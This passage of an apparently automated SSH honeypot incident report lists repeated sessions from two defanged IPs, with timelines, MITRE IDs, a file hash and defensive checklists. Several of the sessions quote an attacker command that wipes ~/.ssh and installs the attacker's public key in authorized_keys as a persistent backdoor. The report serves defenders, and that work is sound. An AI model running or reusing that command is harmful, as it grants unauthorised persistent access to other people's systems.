| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 09:11:11` | `cowrie.session.connect` |
| `2026-06-05 09:11:11` | `cowrie.client.version` |
| `2026-06-05 09:11:11` | `cowrie.client.kex` |
| `2026-06-05 09:11:12` | `cowrie.login.success` |
| `2026-06-05 09:11:13` | `cowrie.session.params` |
| `2026-06-05 09:11:13` | `cowrie.command.input` |
| `2026-06-05 09:11:13` | `cowrie.command.failed` |
| `2026-06-05 09:11:13` | `cowrie.log.closed` |
| `2026-06-05 09:11:14` | `cowrie.session.params` |
| `2026-06-05 09:11:14` | `cowrie.command.input` |
| `2026-06-05 09:11:14` | `cowrie.session.file_download` |
| `2026-06-05 09:11:14` | `cowrie.log.closed` |
| `2026-06-05 09:11:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.208.7[.]216` to AbuseIPDB if not already reported
- [ ] Block `35.208.7[.]216` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e81c945a8ce1

| Field | Detail |
|---|---|
| **Source IP** | `35.208.7[.]216` |
| **First Seen** | 2026-06-05 09:11 |
| **Last Seen** | 2026-06-05 09:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 09:11:17` | `cowrie.session.connect` |
| `2026-06-05 09:11:17` | `cowrie.client.version` |
| `2026-06-05 09:11:17` | `cowrie.client.kex` |
| `2026-06-05 09:11:18` | `cowrie.login.success` |
| `2026-06-05 09:11:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.208.7[.]216` to AbuseIPDB if not already reported
- [ ] Block `35.208.7[.]216` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b0b787708fcc

| Field | Detail |
|---|---|
| **Source IP** | `35.208.7[.]216` |
| **First Seen** | 2026-06-05 09:13 |
| **Last Seen** | 2026-06-05 09:13 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 09:13:09` | `cowrie.session.connect` |
| `2026-06-05 09:13:09` | `cowrie.client.version` |
| `2026-06-05 09:13:09` | `cowrie.client.kex` |
| `2026-06-05 09:13:10` | `cowrie.login.success` |
| `2026-06-05 09:13:10` | `cowrie.session.params` |
| `2026-06-05 09:13:10` | `cowrie.command.input` |
| `2026-06-05 09:13:10` | `cowrie.command.failed` |
| `2026-06-05 09:13:11` | `cowrie.log.closed` |
| `2026-06-05 09:13:11` | `cowrie.session.params` |
| `2026-06-05 09:13:11` | `cowrie.command.input` |
| `2026-06-05 09:13:11` | `cowrie.session.file_download` |
| `2026-06-05 09:13:11` | `cowrie.log.closed` |
| `2026-06-05 09:13:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.208.7[.]216` to AbuseIPDB if not already reported
- [ ] Block `35.208.7[.]216` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f3b7b148de58

| Field | Detail |
|---|---|
| **Source IP** | `35.208.7[.]216` |
| **First Seen** | 2026-06-05 09:13 |
| **Last Seen** | 2026-06-05 09:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 09:13:14` | `cowrie.session.connect` |
| `2026-06-05 09:13:14` | `cowrie.client.version` |
| `2026-06-05 09:13:15` | `cowrie.client.kex` |
| `2026-06-05 09:13:15` | `cowrie.login.success` |
| `2026-06-05 09:13:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.208.7[.]216` to AbuseIPDB if not already reported
- [ ] Block `35.208.7[.]216` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d752ab6c1094

| Field | Detail |
|---|---|
| **Source IP** | `35.208.7[.]216` |
| **First Seen** | 2026-06-05 09:15 |
| **Last Seen** | 2026-06-05 09:15 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 09:15:04` | `cowrie.session.connect` |
| `2026-06-05 09:15:04` | `cowrie.client.version` |
| `2026-06-05 09:15:04` | `cowrie.client.kex` |
| `2026-06-05 09:15:05` | `cowrie.login.success` |
| `2026-06-05 09:15:06` | `cowrie.session.params` |
| `2026-06-05 09:15:06` | `cowrie.command.input` |
| `2026-06-05 09:15:06` | `cowrie.command.failed` |
| `2026-06-05 09:15:06` | `cowrie.log.closed` |
| `2026-06-05 09:15:07` | `cowrie.session.params` |
| `2026-06-05 09:15:07` | `cowrie.command.input` |
| `2026-06-05 09:15:07` | `cowrie.session.file_download` |
| `2026-06-05 09:15:07` | `cowrie.log.closed` |
| `2026-06-05 09:15:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.208.7[.]216` to AbuseIPDB if not already reported
- [ ] Block `35.208.7[.]216` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1dacac78cbd9

| Field | Detail |
|---|---|
| **Source IP** | `35.208.7[.]216` |
| **First Seen** | 2026-06-05 09:15 |
| **Last Seen** | 2026-06-05 09:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 09:15:10` | `cowrie.session.connect` |
| `2026-06-05 09:15:10` | `cowrie.client.version` |
| `2026-06-05 09:15:10` | `cowrie.client.kex` |
| `2026-06-05 09:15:11` | `cowrie.login.success` |
| `2026-06-05 09:15:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.208.7[.]216` to AbuseIPDB if not already reported
- [ ] Block `35.208.7[.]216` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-65504a092de5

| Field | Detail |
|---|---|
| **Source IP** | `35.208.7[.]216` |
| **First Seen** | 2026-06-05 09:16 |
| **Last Seen** | 2026-06-05 09:17 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 09:16:54` | `cowrie.session.connect` |
| `2026-06-05 09:16:54` | `cowrie.client.version` |
| `2026-06-05 09:16:54` | `cowrie.client.kex` |
| `2026-06-05 09:16:55` | `cowrie.login.success` |
| `2026-06-05 09:16:56` | `cowrie.session.params` |
| `2026-06-05 09:16:56` | `cowrie.command.input` |
| `2026-06-05 09:16:56` | `cowrie.command.failed` |
| `2026-06-05 09:16:56` | `cowrie.log.closed` |
| `2026-06-05 09:16:56` | `cowrie.session.params` |
| `2026-06-05 09:16:56` | `cowrie.command.input` |
| `2026-06-05 09:16:57` | `cowrie.session.file_download` |
| `2026-06-05 09:16:57` | `cowrie.log.closed` |
| `2026-06-05 09:17:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.208.7[.]216` to AbuseIPDB if not already reported
- [ ] Block `35.208.7[.]216` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a5e16e4eaa4

| Field | Detail |
|---|---|
| **Source IP** | `35.208.7[.]216` |
| **First Seen** | 2026-06-05 09:17 |
| **Last Seen** | 2026-06-05 09:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 09:17:00` | `cowrie.session.connect` |
| `2026-06-05 09:17:00` | `cowrie.client.version` |
| `2026-06-05 09:17:00` | `cowrie.client.kex` |
| `2026-06-05 09:17:01` | `cowrie.login.success` |
| `2026-06-05 09:17:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.208.7[.]216` to AbuseIPDB if not already reported
- [ ] Block `35.208.7[.]216` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-32f8d97f4558

| Field | Detail |
|---|---|
| **Source IP** | `35.208.7[.]216` |
| **First Seen** | 2026-06-05 09:20 |
| **Last Seen** | 2026-06-05 09:20 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 09:20:37` | `cowrie.session.connect` |
| `2026-06-05 09:20:37` | `cowrie.client.version` |
| `2026-06-05 09:20:37` | `cowrie.client.kex` |
| `2026-06-05 09:20:38` | `cowrie.login.success` |
| `2026-06-05 09:20:38` | `cowrie.session.params` |
| `2026-06-05 09:20:38` | `cowrie.command.input` |
| `2026-06-05 09:20:38` | `cowrie.command.failed` |
| `2026-06-05 09:20:39` | `cowrie.log.closed` |
| `2026-06-05 09:20:39` | `cowrie.session.params` |
| `2026-06-05 09:20:39` | `cowrie.command.input` |
| `2026-06-05 09:20:39` | `cowrie.session.file_download` |
| `2026-06-05 09:20:39` | `cowrie.log.closed` |
| `2026-06-05 09:20:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.208.7[.]216` to AbuseIPDB if not already reported
- [ ] Block `35.208.7[.]216` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ce8c3bf73b5

| Field | Detail |
|---|---|
| **Source IP** | `35.208.7[.]216` |
| **First Seen** | 2026-06-05 09:20 |
| **Last Seen** | 2026-06-05 09:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 09:20:42` | `cowrie.session.connect` |
| `2026-06-05 09:20:42` | `cowrie.client.version` |
| `2026-06-05 09:20:42` | `cowrie.client.kex` |
| `2026-06-05 09:20:43` | `cowrie.login.success` |
| `2026-06-05 09:20:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.208.7[.]216` to AbuseIPDB if not already reported
- [ ] Block `35.208.7[.]216` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1d4fc286e3ca

| Field | Detail |
|---|---|
| **Source IP** | `223.197.186[.]7` |
| **First Seen** | 2026-06-05 09:21 |
| **Last Seen** | 2026-06-05 09:22 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 09:21:58` | `cowrie.session.connect` |
| `2026-06-05 09:21:58` | `cowrie.client.version` |
| `2026-06-05 09:21:59` | `cowrie.client.kex` |
| `2026-06-05 09:21:59` | `cowrie.login.success` |
| `2026-06-05 09:22:00` | `cowrie.session.params` |
| `2026-06-05 09:22:00` | `cowrie.command.input` |
| `2026-06-05 09:22:00` | `cowrie.command.failed` |
| `2026-06-05 09:22:00` | `cowrie.log.closed` |
| `2026-06-05 09:22:00` | `cowrie.session.params` |
| `2026-06-05 09:22:00` | `cowrie.command.input` |
| `2026-06-05 09:22:00` | `cowrie.session.file_download` |
| `2026-06-05 09:22:00` | `cowrie.log.closed` |
| `2026-06-05 09:22:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.197.186[.]7` to AbuseIPDB if not already reported
- [ ] Block `223.197.186[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f44ebf77bef

| Field | Detail |
|---|---|
| **Source IP** | `223.197.186[.]7` |
| **First Seen** | 2026-06-05 09:22 |
| **Last Seen** | 2026-06-05 09:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 09:22:02` | `cowrie.session.connect` |
| `2026-06-05 09:22:02` | `cowrie.client.version` |
| `2026-06-05 09:22:03` | `cowrie.client.kex` |
| `2026-06-05 09:22:03` | `cowrie.login.success` |
| `2026-06-05 09:22:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.197.186[.]7` to AbuseIPDB if not already reported
- [ ] Block `223.197.186[.]7` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c7dea0d8f0c9

| Field | Detail |
|---|---|
| **Source IP** | `35.208.7[.]216` |
| **First Seen** | 2026-06-05 09:22 |
| **Last Seen** | 2026-06-05 09:22 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 09:22:25` | `cowrie.session.connect` |
| `2026-06-05 09:22:25` | `cowrie.client.version` |
| `2026-06-05 09:22:25` | `cowrie.client.kex` |
| `2026-06-05 09:22:26` | `cowrie.login.success` |
| `2026-06-05 09:22:27` | `cowrie.session.params` |
| `2026-06-05 09:22:27` | `cowrie.command.input` |
| `2026-06-05 09:22:27` | `cowrie.command.failed` |
| `2026-06-05 09:22:27` | `cowrie.log.closed` |
| `2026-06-05 09:22:27` | `cowrie.session.params` |
| `2026-06-05 09:22:27` | `cowrie.command.input` |
| `2026-06-05 09:22:28` | `cowrie.session.file_download` |
| `2026-06-05 09:22:28` | `cowrie.log.closed` |
| `2026-06-05 09:22:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.208.7[.]216` to AbuseIPDB if not already reported
- [ ] Block `35.208.7[.]216` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aaee53eb6426

| Field | Detail |
|---|---|
| **Source IP** | `35.208.7[.]216` |
| **First Seen** | 2026-06-05 09:22 |
| **Last Seen** | 2026-06-05 09:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 09:22:30` | `cowrie.session.connect` |
| `2026-06-05 09:22:30` | `cowrie.client.version` |
| `2026-06-05 09:22:31` | `cowrie.client.kex` |
| `2026-06-05 09:22:32` | `cowrie.login.success` |
| `2026-06-05 09:22:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.208.7[.]216` to AbuseIPDB if not already reported
- [ ] Block `35.208.7[.]216` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9d133137176b

| Field | Detail |
|---|---|
| **Source IP** | `35.208.7[.]216` |
| **First Seen** | 2026-06-05 09:24 |
| **Last Seen** | 2026-06-05 09:24 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 09:24:13` | `cowrie.session.connect` |
| `2026-06-05 09:24:13` | `cowrie.client.version` |
| `2026-06-05 09:24:13` | `cowrie.client.kex` |
| `2026-06-05 09:24:14` | `cowrie.login.success` |
| `2026-06-05 09:24:15` | `cowrie.session.params` |
| `2026-06-05 09:24:15` | `cowrie.command.input` |
| `2026-06-05 09:24:15` | `cowrie.command.failed` |
| `2026-06-05 09:24:15` | `cowrie.log.closed` |
| `2026-06-05 09:24:15` | `cowrie.session.params` |
| `2026-06-05 09:24:15` | `cowrie.command.input` |
| `2026-06-05 09:24:16` | `cowrie.session.file_download` |
| `2026-06-05 09:24:16` | `cowrie.log.closed` |
| `2026-06-05 09:24:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.208.7[.]216` to AbuseIPDB if not already reported
- [ ] Block `35.208.7[.]216` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-16dc2664fce2

| Field | Detail |
|---|---|
| **Source IP** | `35.208.7[.]216` |
| **First Seen** | 2026-06-05 09:24 |
| **Last Seen** | 2026-06-05 09:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 09:24:19` | `cowrie.session.connect` |
| `2026-06-05 09:24:19` | `cowrie.client.version` |
| `2026-06-05 09:24:19` | `cowrie.client.kex` |
| `2026-06-05 09:24:20` | `cowrie.login.success` |
| `2026-06-05 09:24:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.208.7[.]216` to AbuseIPDB if not already reported
- [ ] Block `35.208.7[.]216` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c9ab2bd063df

| Field | Detail |
|---|---|
| **Source IP** | `223.197.186[.]7` |
| **First Seen** | 2026-06-05 09:28 |
| **Last Seen** | 2026-06-05 09:29 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 09:28:57` | `cowrie.session.connect` |
| `2026-06-05 09:28:57` | `cowrie.client.version` |
| `2026-06-05 09:28:57` | `cowrie.client.kex` |
| `2026-06-05 09:28:57` | `cowrie.login.success` |
| `2026-06-05 09:28:58` | `cowrie.session.params` |
| `2026-06-05 09:28:58` | `cowrie.command.input` |
